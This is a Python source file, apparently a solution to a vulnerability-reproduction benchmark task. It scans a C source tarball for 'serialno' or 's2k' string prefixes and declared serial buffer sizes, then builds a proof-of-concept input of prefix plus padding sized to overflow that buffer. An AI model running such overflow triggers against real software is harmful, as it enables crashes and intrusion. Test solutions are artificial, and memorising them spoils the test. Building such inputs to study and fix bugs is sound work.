import tarfile
import re

class Solution:
    def _read_text_files(self, src_path):
        texts = []
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if any(name.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".hh", ".txt", ".md")):
                        try:
                            data = tf.extractfile(m).read()
                            texts.append(data.decode("utf-8", errors="ignore"))
                        except Exception:
                            pass
        except Exception:
            pass
        return texts

    def _extract_string_literals(self, text):
        # Simple C-like string literal matcher
        # Matches " ... " with potential escaped quotes
        pattern = re.compile(r'"((?:[^"\\]|\\.)*)"')
        return [m.group(1) for m in pattern.finditer(text)]

    def _score_literal(self, lit, context):
        l = lit.lower()
        score = 0
        if "serial" in l:
            score += 25
        if "serialno" in l or "serial_no" in l or "serial-no" in l:
            score += 30
        if "s2k" in l:
            score += 60
        if "card" in l:
            score += 10
        if l.endswith(":") or l.endswith("=") or l.endswith(" "):
            score += 5
        # Context scoring: look around the literal
        around = context
        around_lower = around.lower()
        for kw, val in (("strncmp", 10), ("strcmp", 10), ("sscanf", 12), ("scanf", 8),
                        ("fscanf", 8), ("memcmp", 7), ("starts", 6), ("prefix", 5)):
            if kw in around_lower:
                score += val
        # Penalize obvious non-input or log-only literals
        for bad in ("error", "failed", "invalid", "warn", "usage", "printf", "fprintf"):
            if bad in around_lower:
                score -= 6
        # Very long literals are less likely to be prefixes
        if len(lit) > 64:
            score -= (len(lit) - 64)
        return score

    def _find_best_prefix(self, texts):
        candidates = []
        for text in texts:
            literals = []
            try:
                literals = self._extract_string_literals(text)
            except Exception:
                continue
            for m in re.finditer(r'"((?:[^"\\]|\\.)*)"', text):
                lit = m.group(1)
                if "serial" not in lit.lower():
                    continue
                start = m.start()
                context = text[max(0, start-80): min(len(text), m.end()+80)]
                score = self._score_literal(lit, context)
                candidates.append((score, lit))
        if not candidates:
            return None
        candidates.sort(key=lambda x: x[0], reverse=True)
        return candidates[0][1]

    def _discover_buffer_size_hint(self, texts):
        # Try to find a buffer sized for serial strings
        size_candidates = []
        buf_decl_re = re.compile(r'char\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]')
        for text in texts:
            for m in buf_decl_re.finditer(text):
                var, size = m.group(1), m.group(2)
                if "serial" in var.lower():
                    try:
                        size_candidates.append(int(size))
                    except Exception:
                        pass
        if size_candidates:
            size_candidates.sort()
            return size_candidates[0]
        # search for macros
        macro_re = re.compile(r'#\s*define\s+\w*SERIAL\w*\s+(\d+)')
        for text in texts:
            for m in macro_re.finditer(text):
                try:
                    size_candidates.append(int(m.group(1)))
                except Exception:
                    pass
        if size_candidates:
            size_candidates.sort()
            return size_candidates[0]
        return None

    def _build_line(self, prefix, total_len=27, end=b"\n"):
        # Build a line with exact total_len bytes if possible (including newline)
        if isinstance(prefix, bytes):
            pfx_bytes = prefix
        else:
            pfx_bytes = prefix.encode("ascii", errors="ignore")
        # Ensure newline only counted once
        end_len = len(end)
        if total_len is not None and total_len > 0:
            payload_len = total_len - len(pfx_bytes) - end_len
            if payload_len < 1:
                # If prefix already too long, just append a minimal payload
                payload_len = 16
                total = pfx_bytes + b"A" * payload_len + end
                return total
            return pfx_bytes + b"A" * payload_len + end
        # Without total length constraint, default payload length
        return pfx_bytes + (b"A" * 32) + end

    def solve(self, src_path: str) -> bytes:
        texts = self._read_text_files(src_path)
        best_prefix = self._find_best_prefix(texts)

        # Prefer detected prefix; else use common defaults
        lines = []

        if best_prefix:
            # Use the best detected prefix first
            # Attempt to craft exactly 27 bytes total
            line = self._build_line(best_prefix, total_len=27, end=b"\n")
            lines.append(line)
        else:
            # Fallback: craft common variations keeping each line 27 bytes
            # 1) SERIALNO: + 17 payload -> 26 + newline = 27
            lines.append(self._build_line("SERIALNO:", total_len=27, end=b"\n"))
            # 2) serialno: lowercase
            lines.append(self._build_line("serialno:", total_len=27, end=b"\n"))
            # 3) s2k-serial: includes s2k hint
            lines.append(self._build_line("s2k-serial:", total_len=27, end=b"\n"))

        # If buffer size hint is available, add an additional line tuned to overflow with minimal bytes
        size_hint = self._discover_buffer_size_hint(texts)
        if size_hint:
            # Choose a prefix likely valid; prefer detected, else "serialno:"
            prefix_for_hint = best_prefix if best_prefix else "serialno:"
            # Build a line with payload slightly exceeding buffer size (size_hint + 1)
            # Try to keep as short as possible: total length = len(prefix) + (size_hint+1) + newline
            payload_len = size_hint + 1
            if isinstance(prefix_for_hint, bytes):
                pfx = prefix_for_hint
            else:
                pfx = str(prefix_for_hint).encode("ascii", errors="ignore")
            line = pfx + (b"B" * payload_len) + b"\n"
            # Only add if not already present and if it doesn't exceed too much
            lines.append(line)

        # Concatenate lines; put the most promising (first) one at the top
        poc = b"".join(lines[:4])  # limit number of lines to keep PoC concise
        return poc if poc else b"serialno:" + b"A" * 17 + b"\n"